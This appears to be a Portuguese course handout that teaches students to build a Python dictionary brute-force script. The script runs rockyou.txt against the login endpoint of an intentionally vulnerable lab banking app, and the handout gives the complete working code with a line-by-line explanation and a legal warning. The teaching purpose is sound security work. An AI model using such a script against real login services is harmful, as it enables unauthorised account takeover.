# Apostila Prática: Automação de Força Bruta (Dicionário) com Python e Requests

**Disciplina / Módulo:** UC11 — Requests, Arquivos e Automação de Testes  
**Ambiente de Laboratório:** NexusBank Corporate  
**Linguagem:** Python 3  
**Wordlist:** `rockyou.txt`

---

## ⚠️ Aviso Legal e Ético (Regra Número Um)

> **Atenção:** As técnicas demonstradas neste material têm finalidade estritamente **educacional** e de **auditoria defensiva**. Devem ser executadas **exclusivamente** contra o servidor de laboratório autorizado pelo professor em ambiente controlado de sala de aula.
>
> A aplicação contra sistemas de terceiros ou serviços na internet sem autorização prévia por escrito é ilegal e passível de penalidades conforme a legislação vigente:
> * **Marco Civil da Internet (Lei nº 12.965/2014)**
> * **Artigo 154-A do Código Penal Brasileiro** (Invasão de dispositivo informático)

---

## 1. Fundamentos Teóricos: O que é uma Requisição HTTP?

Antes de escrever qualquer linha de código, é fundamental entender **o que acontece por trás dos panos** quando um programa se comunica com uma aplicação web.

### O Modelo Cliente-Servidor
A web funciona em um modelo de **pergunta e resposta**:
1. **Cliente (Client):** É quem faz o pedido. Pode ser o navegador (Google Chrome, Firefox) ou o seu script Python.
2. **Servidor (Server):** É a máquina remota que hospeda a aplicação (no nosso caso, o servidor da aula rodando o *NexusBank Corporate*). Ele recebe a pergunta, processa e devolve uma resposta.

```text
+---------------+    1. Requisição (POST /login + JSON)   +---------------+
| Script Python | ---------------------------------------> | Servidor      |
|  (requests)   | <--------------------------------------- | (NexusBank)   |
+---------------+       2. Resposta (Status Code 200/401)  +---------------+
```

### O que compõe uma Requisição HTTP?
Quando o script conversa com o servidor, ele envia um pacote contendo:
* **Método HTTP (Verbo):** Indica a ação desejada:
  * `GET`: Solicita dados sem enviar alterações (ex.: consultar a saúde da API).
  * `POST`: Envia dados para o servidor processar (ex.: credenciais de login, cadastro).
* **Endpoint (URL/Rota):** O endereço específico do serviço no servidor. Exemplo: `http://127.0.0.1:8002/login`.
* **Headers (Cabeçalhos):** Metadados sobre a requisição (ex.: tipo de conteúdo, formato aceito).
* **Body / Payload (Corpo):** Os dados reais enviados na requisição. No nosso caso, um objeto estruturado em formato **JSON** contendo o usuário e a senha candidata.

### O que o Servidor responde?
O servidor processa o pedido e devolve:
* **Status Code (Código de Status):** Um número de três dígitos que informa imediatamente o resultado:
  * `200 OK`: Sucesso! A operação foi aceita (a combinação usuário/senha está correta).
  * `401 Unauthorized`: Não autorizado (usuário ou senha incorretos).
  * `404 Not Found`: Rota inexistente.
  * `500 Internal Server Error`: Erro interno no servidor.
* **Corpo da Resposta (Response Body):** Geralmente um JSON com detalhes (`{"ok": true, "token": "..."}` ou `{"detail": "Usuario ou senha invalidos."}`).

> **Princípio do Brute Force / Dicionário:**  
> O script explora exatamente o comportamento do servidor: ele envia sucessivas requisições `POST` com senhas diferentes e analisa o `status_code`. Enquanto receber `401`, continua tentando. Assim que receber `200`, a senha correta foi descoberta!

---

## 2. O Alvo do Laboratório: NexusBank Corporate

O laboratório utiliza uma aplicação bancária intencionalmente vulnerável:

* **Endereço Base:** `http://<IP-do-professor>:8002` (ou `http://127.0.0.1:8002` se rodar localmente).
* **Endpoint de Login de Clientes:** `/login`
* **Método:** `POST`
* **Formato dos Dados:** JSON com os campos:
  ```json
  {
    "usuario": "ana",
    "senha": "sua_senha_aqui"
  }
  ```
* **Comportamento da Resposta:**
  * **Senha Certa:** Código `200` e JSON contendo `{"ok": true, "usuario": "ana", ...}`.
  * **Senha Errada:** Código `401` e JSON contendo `{"detail": "Usuario ou senha invalidos."}`.

---

## 3. Passo a Passo da Construção do Script

Vamos construir o script mentalmente, entendendo o papel de cada bloco.

### Passo 1 — Importação das Bibliotecas (`imports`)
Para interagir com a rede e controlar o tempo, precisamos importar os módulos adequados:

```python
import os
import sys
import time
import requests
```

* **`requests`**: Biblioteca que abstrai toda a complexidade de conexões de rede HTTP. Permite fazer `requests.post()` ou `requests.get()` de forma direta.
* **`time`**: Módulo nativo do Python usado para cronometrar a duração do ataque e calcular estatísticas de velocidade.
* **`os` e `sys`**: Módulos do sistema para conferir se o arquivo existe antes de começar e encerrar o script com segurança se necessário.

---

### Passo 2 — Definição das Variáveis de Configuração
Centralizar os parâmetros configuráveis no início do código facilita ajustes sem precisar alterar a lógica interna:

```python
# Endereço da API do laboratório (ajuste para o IP do professor se necessário)
URL_ALVO = "http://127.0.0.1:8002/login"

# Usuário que será alvo do ataque de dicionário
USUARIO_ALVO = "ana"

# Caminho para o arquivo de senhas
ARQUIVO_WORDLIST = "rockyou.txt"
```

---

### Passo 3 — Abrindo e Lendo o Arquivo de Wordlist (`rockyou.txt`)

Uma **wordlist** é um arquivo de texto com milhões de palavras, uma em cada linha. Arquivos como a `rockyou.txt` têm mais de 14 milhões de senhas e pesam centenas de megabytes.

Se tentarmos carregar todo o arquivo para uma lista com `arquivo.readlines()`, o Python carregará centenas de megabytes ou gigabytes direto na memória RAM, podendo travar a máquina.

Por isso, utilizamos o laço **linha a linha**:

```python
with open(ARQUIVO_WORDLIST, "r", encoding="latin-1", errors="ignore") as arquivo:
    for linha in arquivo:
        senha = linha.strip()
```

#### Detalhes fundamentais deste bloco:
1. **O comando `with open(...)`**:
   * Garante que o arquivo seja fechado automaticamente pelo sistema operacional assim que o bloco terminar ou caso ocorra um erro.
2. **O parâmetro `encoding="latin-1"` com `errors="ignore"`**:
   * A wordlist `rockyou.txt` foi extraída de vazamentos reais antigos e contém caracteres que **não são válidos em UTF-8**. Se você abrir com `encoding="utf-8"`, o Python lançará um erro `UnicodeDecodeError` e travará o script. Usar `latin-1` (ou `errors="ignore"`) garante que o script leia o arquivo do começo ao fim sem falhas.
3. **O método `.strip()`**:
   * Toda linha lida de um arquivo termina com o caractere invisível de quebra de linha `\n`. Se você não usar `.strip()`, a senha enviada será `"123456\n"` em vez de `"123456"`, e a validação no servidor falhará.

---

### Passo 4 — O Loop de Tentativas e a Montagem do Payload

Para cada senha lida, preparamos o pacote de dados que será enviado:

```python
        # Ignora linhas em branco
        if not senha:
            continue

        # Monta os dados no formato esperado pela API (dicionário Python)
        payload = {
            "usuario": USUARIO_ALVO,
            "senha": senha
        }
```

---

### Passo 5 — Disparando a Requisição HTTP (`requests.post`)

Aqui o Python envia a requisição para a rede:

```python
        try:
            resposta = requests.post(URL_ALVO, json=payload, timeout=5)
        except requests.exceptions.RequestException as erro:
            print(f"[ERRO DE CONEXAO] Não foi possível conectar ao servidor: {erro}")
            break
```

* **`json=payload`**: O parâmetro `json` do `requests` faz duas coisas automaticamente:
  1. Converte o dicionário Python em uma string formatada em JSON (`{"usuario": "ana", "senha": "..."}`).
  2. Adiciona o cabeçalho HTTP `Content-Type: application/json`.
* **`timeout=5`**: Se o servidor travar ou a rede cair, o script aguarda no máximo 5 segundos antes de abortar a requisição, em vez de congelar para sempre.

---

### Passo 6 — Analisando a Resposta e Condição de Parada (`break`)

O script avalia o código retornado pelo servidor:

```python
        if resposta.status_code == 200:
            print(f"\n[+] SUCESSO! Senha encontrada para o usuário '{USUARIO_ALVO}': {senha}")
            break
        elif resposta.status_code == 401:
            print(f"[-] Tentativa: '{senha}' -> Incorreta (Status 401)")
```

* Se `status_code == 200`: Acertamos a senha! Exibimos a mensagem de sucesso e executamos `break` para **interromper imediatamente o loop**. Não há necessidade de continuar testando o restante do arquivo.
* Se `status_code == 401`: A senha estava errada. O loop segue naturalmente para a próxima linha da wordlist.

---

## 4. Código Completo: `bruteforce_rockyou.py`

Copie e cole o código abaixo em um arquivo chamado `bruteforce_rockyou.py`:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Apostila Prática - UC11 (Aula 21/09)
Script: Força Bruta / Ataque de Dicionário em Endpoint de Login
Alvo: NexusBank Corporate
"""

import os
import sys
import time
import requests

# ==============================================================================
# 1. CONFIGURAÇÕES DO ALVO E DO ARQUIVO
# ==============================================================================
# Troque pelo IP do professor se estiver em outra máquina na rede do laboratório
URL_ALVO = "http://127.0.0.1:8002/login"

# Usuário de teste da aplicação (seed da aula: ana, bruno, admin)
USUARIO_ALVO = "ana"

# Nome do arquivo de wordlist
ARQUIVO_WORDLIST = "rockyou.txt"


# ==============================================================================
# 2. VALIDAÇÃO DO AMBIENTE
# ==============================================================================
if not os.path.exists(ARQUIVO_WORDLIST):
    print(f"[!] Arquivo de wordlist '{ARQUIVO_WORDLIST}' não foi encontrado na pasta atual.")
    print("    Certifique-se de que o arquivo está na mesma pasta do script.")
    sys.exit(1)


# ==============================================================================
# 3. EXECUÇÃO DO ATAQUE DE DICIONÁRIO
# ==============================================================================
print("=" * 65)
print("   INICIANDO TESTE DE FORÇA BRUTA (ATAQUE DE DICIONÁRIO)")
print("=" * 65)
print(f" Alvo       : {URL_ALVO}")
print(f" Usuário    : {USUARIO_ALVO}")
print(f" Wordlist   : {ARQUIVO_WORDLIST}")
print("=" * 65)

tentativas = 0
senha_encontrada = None
tempo_inicio = time.time()

# Abre o arquivo linha a linha (não sobrecarrega a memória RAM)
# encoding='latin-1' e errors='ignore' evitam erros comuns na rockyou.txt
with open(ARQUIVO_WORDLIST, "r", encoding="latin-1", errors="ignore") as arquivo:
    for linha in arquivo:
        # Remove espaços em branco e o caractere de quebra de linha (\n)
        senha = linha.strip()

        # Pula eventuais linhas vazias
        if not senha:
            continue

        tentativas += 1

        # Monta a carga de dados (payload) em formato de dicionário
        payload = {
            "usuario": USUARIO_ALVO,
            "senha": senha
        }

        try:
            # Envia a requisição HTTP POST com corpo JSON
            resposta = requests.post(URL_ALVO, json=payload, timeout=5)

            # Analisa o código de retorno da API
            if resposta.status_code == 200:
                senha_encontrada = senha
                print(f"[+] [TENTATIVA {tentativas:04d}] >>> SUCESSO! Senha correta: '{senha}' <<<")
                break
            elif resposta.status_code == 401:
                print(f"[-] [TENTATIVA {tentativas:04d}] Senha: '{senha}' -> Incorreta (401)")
            else:
                print(f"[?] [TENTATIVA {tentativas:04d}] Senha: '{senha}' -> Status inesperado: {resposta.status_code}")

        except requests.exceptions.RequestException as erro:
            print(f"\n[!] Falha de comunicação com o servidor: {erro}")
            print("[!] Verifique se o servidor do laboratório está ligado.")
            break

tempo_total = time.time() - tempo_inicio

# ==============================================================================
# 4. RELATÓRIO FINAL
# ==============================================================================
print("\n" + "=" * 65)
print("   RESUMO DA EXECUÇÃO")
print("=" * 65)
print(f" Total de tentativas realizadas : {tentativas}")
print(f" Tempo total de execução       : {tempo_total:.2f} segundos")

if tempo_total > 0:
    velocidade = tentativas / tempo_total
    print(f" Velocidade média               : {velocidade:.1f} requisições/segundo")

if senha_encontrada:
    print(f" Resultado                      : SENHA LOCALIZADA -> '{senha_encontrada}'")
else:
    print(" Resultado                      : Senha não encontrada na wordlist testada.")
print("=" * 65)
```

---

## 5. Explicação Detalhada Linha a Linha

| Linhas | Código | O que faz no sistema? |
| :--- | :--- | :--- |
| **8–11** | `import os, sys, time, requests` | Carrega módulos para conferir arquivos (`os`), abortar o script se faltar algo (`sys`), medir tempo (`time`) e disparar conexões de rede (`requests`). |
| **17–23** | `URL_ALVO`, `USUARIO_ALVO`, `ARQUIVO_WORDLIST` | Guarda as variáveis principais: onde está o servidor, quem atacamos e qual lista de senhas usamos. |
| **29–33** | `if not os.path.exists(...)` | Verifica se o arquivo `rockyou.txt` está presente na pasta antes de rodar o código. |
| **45–47** | `tentativas = 0`, `tempo_inicio = time.time()` | Cria um contador de tentativas e anota o relógio do sistema no momento exato do início. |
| **51** | `with open(..., encoding="latin-1", errors="ignore")` | Abre o arquivo de forma segura, ignorando bytes corrompidos típicos da wordlist. |
| **52** | `for linha in arquivo:` | Lê a wordlist linha por linha, sem carregar tudo na memória RAM. |
| **54** | `senha = linha.strip()` | Limpa a senha, retirando o `\n` (Enter) do final da linha. |
| **57–58** | `if not senha: continue` | Se a linha estiver em branco, pula para a próxima iteração. |
| **60** | `tentativas += 1` | Soma +1 ao contador de tentativas realizadas. |
| **63–66** | `payload = {"usuario": ..., "senha": ...}` | Cria o dicionário com os campos esperados pela API. |
| **69** | `requests.post(URL_ALVO, json=payload)` | Conecta na API e envia os dados formatados em JSON. |
| **72–75** | `if resposta.status_code == 200:` | Se o servidor respondeu 200 (autorizado), achamos a senha! Salva o valor e usa `break` para parar o loop. |
| **76–77** | `elif resposta.status_code == 401:` | Se respondeu 401 (senha errada), mostra no terminal e continua o loop. |
| **81–84** | `except requests.exceptions.RequestException` | Se o servidor for desligado ou a rede cair, trata a falha sem quebrar o Python com erros gigantes. |
| **86** | `tempo_total = time.time() - tempo_inicio` | Calcula o tempo gasto subtraindo o tempo inicial do momento final. |
| **92–104** | `print(...)` | Mostra o resumo detalhado no terminal (total de tentativas, velocidade e senha encontrada). |
